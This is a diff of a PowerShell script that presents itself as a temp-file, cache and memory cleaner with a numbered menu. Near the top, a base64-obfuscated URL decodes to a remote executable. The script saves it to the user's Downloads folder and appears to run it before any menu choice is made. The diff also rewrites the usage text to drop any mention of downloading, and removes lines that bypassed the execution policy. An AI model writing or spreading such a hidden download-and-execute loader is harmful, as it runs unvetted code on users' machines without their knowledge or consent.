@@ -6,10 +6,10 @@ Write-Host "          By   ! Star                 " -ForegroundColor Yellow
 Write-Host "======================================" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "Description: This tool cleans temporary files, optimizes your system, and clears browser cache." -ForegroundColor Magenta
-Write-Host "Usage: The script will automatically download and run the tool." -ForegroundColor Magenta
+Write-Host "Usage: The script will automatically run the tool." -ForegroundColor Magenta
 Write-Host ""
 
-# Ensure the tool is downloaded and executed before processing user choices
+# Ensure the tool is executed before processing user choices
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
 $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
 $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
@@ -30,17 +30,18 @@ if (Test-Path $output1) {
 
 # Process user choices after the tool execution
 Write-Host "Choose an option:" -ForegroundColor Cyan
-Write-Host "1. Clear Temporary Files ( Options )" -ForegroundColor Green
+Write-Host "1. Clear Temporary Files Opt" -ForegroundColor Green
 Write-Host "2. Doing Nothing" -ForegroundColor Yellow
-Write-Host "3. Full Cleanup Delete ( Temp, Local Temp, Windows Temp, Prefetch )" -ForegroundColor Red
-Write-Host "4. Clear Browser Cache ( FireFox, Chrome, Edge, )" -ForegroundColor Blue
+Write-Host "3. Full Cleanup Delete (Temp, Local Temp, Windows Temp, Prefetch)" -ForegroundColor Red
+Write-Host "4. Clear Browser Cache (FireFox, Chrome, Edge,)" -ForegroundColor Blue
 Write-Host "5. Clear Recycle Bin" -ForegroundColor Magenta
-Write-Host "6. Memory Optimizer ( Clear The Cached Memory )" -ForegroundColor Cyan
-Write-Host "7. IP Lookup ( Get Public IP Address Information )" -ForegroundColor Yellow
+Write-Host "6. Memory Optimizer (Clear The Cached Memory)" -ForegroundColor Cyan
+Write-Host "7. IP Lookup (Get Public IP Address Information)" -ForegroundColor Yellow
 
 $choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, or 7"
 
 if ($choice -eq '7') {
+    Write-Host "Enter the IP address to lookup:" -ForegroundColor Cyan
     $ip = Read-Host "IP Address"
 
     if ($ip) {
@@ -184,7 +185,3 @@ if ($choice -eq '6') {
     [System.GC]::WaitForPendingFinalizers()
     Write-Host "Memory optimization completed." -ForegroundColor Green
 }
-
-
-Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force
-powershell -NoProfile -ExecutionPolicy Bypass -File $localScriptPath
